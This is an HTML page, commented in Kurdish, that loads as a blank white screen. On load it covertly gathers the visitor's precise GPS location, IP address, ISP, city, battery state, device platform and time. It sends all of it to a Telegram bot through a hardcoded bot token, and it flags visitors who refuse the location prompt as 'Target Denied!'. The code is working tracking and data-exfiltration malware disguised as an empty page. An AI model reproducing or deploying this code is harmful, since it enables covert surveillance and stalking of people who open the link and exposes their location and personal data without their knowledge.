<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <title> </title>
    <style>body { background: white; margin: 0; overflow: hidden; }</style>
</head>
<body onload="capture()">

<script>
    const TK = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";

    async function capture() {
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');
        if (!uid) return;

        // ١. داواکردنی لۆکەیشن (پەنجەرەی Allow لێرە دەردەکەوێت)
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            
            // ٢. کۆکردنەوەی زانیارییەکان بە خێرایی
            let ip = "N/A", isp = "Korek Telecom", city = "Erbil/Bakhtiari";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                ip = data.ip;
                isp = data.org;
                city = data.city + "/" + (data.region || "");
            } catch(e) {}

            let bat = "N/A", ch = "No";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                bat = Math.floor(b.level * 100) + "%";
                ch = b.charging ? "Yes" : "No";
            }

            const time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });

            // ٣. ڕێکخستنی نامەکە ڕێک بەو شێوەیەی داوات کردووە
            let report = `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
                         `🌐 <b>IP:</b> <code>${ip}</code> (${isp})\n` +
                         `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
                         `🔋 <b>Battery:</b> <code>${bat}</code> (Charging: ${ch})\n` +
                         `🕒 <b>Time:</b> <code>${time}</code>\n` +
                         `🏙️ <b>City:</b> <code>${city}</code>`;

            // ٤. ناردنی خێرا بەبێ پچڕان (sendBeacon)
            const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
            navigator.sendBeacon(url);

        }, (err) => {
            // ئەگەر Allow نەکرد
            navigator.sendBeacon(`https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=⚠️ Target Denied!`);
        }, { enableHighAccuracy: true });
    }
</script>
</body>
</html>
